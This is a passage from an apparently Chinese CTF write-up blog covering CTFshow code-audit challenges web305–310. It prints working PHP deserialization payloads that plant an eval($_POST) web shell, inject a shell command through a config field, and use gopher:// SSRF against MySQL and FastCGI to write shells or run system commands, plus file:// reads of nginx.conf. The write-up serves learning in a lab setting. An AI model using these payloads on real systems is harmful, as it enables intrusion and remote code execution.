operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>checklogin.phpä¸­æœ‰ååºåˆ—åŒ–çš„ç‚¹ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">'fun.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span><span class="token variable">$user_cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$user_cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$user_cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ„é€ payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">user</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token string">'yn.php'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token string">'&lt;?php @eval($_POST['</span><span class="token number">1</span><span class="token string">']);?>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210909105655342.png" alt="image-20210909105655342"></p><p><strong>è¿æ¥æœ¨é©¬ï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210909110329883.png" alt="image-20210909110329883"></p><h1 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h1><p>é¢˜ç›®è¯´å¼€å§‹ä½¿ç”¨mvcç»“æ„</p><p><a href="https://www.runoob.com/design-pattern/mvc-pattern.html" target="_blank" rel="noopener">MVC æ¨¡å¼</a></p><p><strong>å®¡è®¡å¼€å§‹ï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210909144721407.png" alt="image-20210909144721407"></p><p>è·Ÿè¸ªå‡½æ•°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210909144748121.png" alt="image-20210909144748121"></p><p>ä½äºclass.phpï¼Œä½†æ˜¯å…¶ä¸­æ²¡æœ‰è°ƒç”¨closeçš„åœ°æ–¹ï¼Œå…¨å±€æœç´¢æ‰¾åˆ°æƒ³è¦çš„ï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210909144906591.png" alt="image-20210909144906591"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210909144929081.png" alt="image-20210909144929081"></p><p>å°±åŸºæœ¬å°±å¯ä»¥å†™payloadäº†ï¼š<strong>å¯¹è±¡æ³¨å…¥</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">dao</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$conn</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">conn</span>    <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">log</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$title</span><span class="token operator">=</span><span class="token string">'yn.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$info</span><span class="token operator">=</span><span class="token string">'&lt;?php @eval($_POST[1]);?>'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">title</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo urlencode(serialize($a));</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾ååºåˆ—åŒ–çš„ç‚¹åœ¨å“ªé‡Œï¼Œè¦æ±‚æ˜¯å¿…é¡»åŒ…å«dao.phpï¼Œæ‰€ä»¥æœ€åé‡‡ç”¨äº†index.phpä¸­çš„ç‚¹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210909145841894.png" alt="image-20210909145841894"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€æ­¥base64è§£ç ï¼Œæ‰€ä»¥åœ¨ä¸Šé¢è¾“å‡ºæ—¶éœ€è¦æ·»åŠ base64_encode</p><p>æŠ“åŒ…index.phpä¿®æ”¹cookieç”Ÿæˆyn.phpï¼Œèšå‰‘ç»ƒå°±å¯ä»¥äº†ï¼Œç„¶åå‘½ä»¤è¡Œå¯åŠ¨åœ¨htmlç›®å½•ä¸‹cat flag.phpå°±å¯ä»¥äº†ï¼</p><h1 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210910164246109.png" alt="image-20210910164246109"></p><p>ç„¶åæ ¹æ®dao.phpæŸ¥æ‰¾è¿™æ¡<code>$this-&gt;config-&gt;cache_dir</code>åˆ©ç”¨é“¾å‰è€…å°±åœ¨dao.phpï¼Œåè€…åœ¨dao.phpæ‰€åŒ…å«çš„config.phpï¼Œç„¶åæ‰¾ååºåˆ—åŒ–çš„ç‚¹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210911193633738.png" alt="image-20210911193633738"></p><p>å…¶ä¸­logout.phpçš„å¯ä»¥è°ƒç”¨clearCacheå‡½æ•°ï¼Œè€Œä¸”åˆåœ¨åŒ…å«å…³ç³»ä¹‹å†…ï¼Œæ„é€ pocï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">dao</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">config</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$cache_dir</span> <span class="token operator">=</span> <span class="token string">';cat ../flag.php >1.txt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210911201039477.png" alt="image-20210911201039477"></p><h1 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h1><p>è¿™æŠŠåˆ©ç”¨çš„äº‹gopheræ‰€ä»¥å…¨å±€æœç´¢ä¸€ä¸‹curlå…³é”®ä»£ç åœ¨fun.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">sds_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\{|\}|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">checkUpdate</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå…¨å±€æœç´¢checkUpdateå‡½æ•°ï¼Œå‘ç°åœ¨dao.phpä¸­æœ‰è°ƒç”¨</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210912155036884.png" alt="image-20210912155036884"></p><p>ä¸å‡ºæ„å¤–update_urlåœ¨dao.phpæ‰€åŒ…å«çš„config.php</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210912155145484.png" alt="image-20210912155145484"></p><p>é‚£ä¹ˆå‰©ä¸‹çš„é—®é¢˜å°±æ˜¯å¦‚ä½•è§¦å‘<code>checkVersion()</code>ç»è¿‡æœç´¢åˆ©ç”¨çš„æ˜¯index.phpä¸­çš„ååºåˆ—åŒ–æ¥æ‰“ï¼Œå…¶æ ·è²Œä¸web307ä¸€æ ·ï¼ŒåŒæ—¶åœ¨config.phpä¸­å¯ä»¥çœ‹åˆ°æ˜¯æ— å¯†ç mysqlï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥åˆ©ç”¨å·¥å…·<code>gopherus</code>æ¥æ„é€ ä¸€ä¸‹</p><p><strong>æ‰“æ— å¯†ç mysqlçš„payloadï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210912170513377.png" alt="image-20210912170513377"></p><p>ä¸Šé¢æœ¨é©¬å†™é”™äº†æ˜¯POSTï¼Œæˆ‘ä¹Ÿæ˜¯é†‰äº†</p><p><strong>æ„é€ pocï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">dao</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">config</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$update_url</span> <span class="token operator">=</span> 'gopher<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%36%2e%70%68%70%27%01%00%00%00%01';</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210912171659357.png" alt="image-20210912171659357"></p><p>catä»¥åå³é”®æºä»£ç å°±å¯ä»¥äº†</p><h1 id="web309â€”â€”fastcgi"><a href="#web309â€”â€”fastcgi" class="headerlink" title="web309â€”â€”fastcgi"></a>web309â€”â€”fastcgi</h1><p><strong>æç¤ºï¼š</strong><code>éœ€è¦æ‹¿**shell**ï¼Œ308çš„æ–¹æ³•ä¸è¡Œäº†,mysql æœ‰å¯†ç äº†</code></p><p>æ“ä½œå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œæ”¹æ”¹pocå°±è¡Œäº†</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210912172729363.png" alt="image-20210912172729363"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">dao</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">config</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$update_url</span> <span class="token operator">=</span> 'gopher<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27cat%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210912172636858.png" alt></p><h1 id="web310â€”â€”file-åè®®"><a href="#web310â€”â€”file-åè®®" class="headerlink" title="web310â€”â€”file://åè®®"></a>web310â€”â€”file://åè®®</h1><p><a href="https://blog.csdn.net/qq1105515654/article/details/78037763" target="_blank" rel="noopener">NginxæœåŠ¡å™¨nginx.confçš„ç»„æˆå’Œä½œç”¨è¯¦è§£</a></p><p><strong>pocï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">dao</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">config</span><span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$update_url</span> <span class="token operator">=</span> 'file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///etc/nginx/nginx.conf';}</span><span class="token variable">$d</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å¾—åˆ°ä¸‹é¢ä¸€äº›å…³é”®å†…å®¹ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php">server <span class="token punctuation">{</span>    listen       <span class="token number">4476</span><span class="token punctuation">;</span>    server_name  localhost<span class="token punctuation">;</span>    root         <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>flag<span class="token punctuation">;</span>    index index<span class="token punctuation">.</span>html<span class="token punctuation">;</span>    proxy_set_header Host <span class="token variable">$host</span><span class="token punctuation">;</span>    proxy_set_header X<span class="token operator">-</span>Real<span class="token operator">-</span><span class="token constant">IP</span> <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>    proxy_set_header X<span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span> <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4476è¿™ä¸ªç«¯å£æ˜¯å®šå‘åˆ°/var/flagçš„ï¼Œé‚£ä¹ˆè®¿é—®å°±å¯ä»¥</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">dao</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">config</span><span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$update_url</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:4476';}</span><span class="token variable">$d</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ“ä½œå’Œ309ä¸€æ ·</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ctfshowä¹‹Web(ä¸ƒ)</title>
      <link href="/2021/08/31/ctfshow-zhi-ssrf/"/>
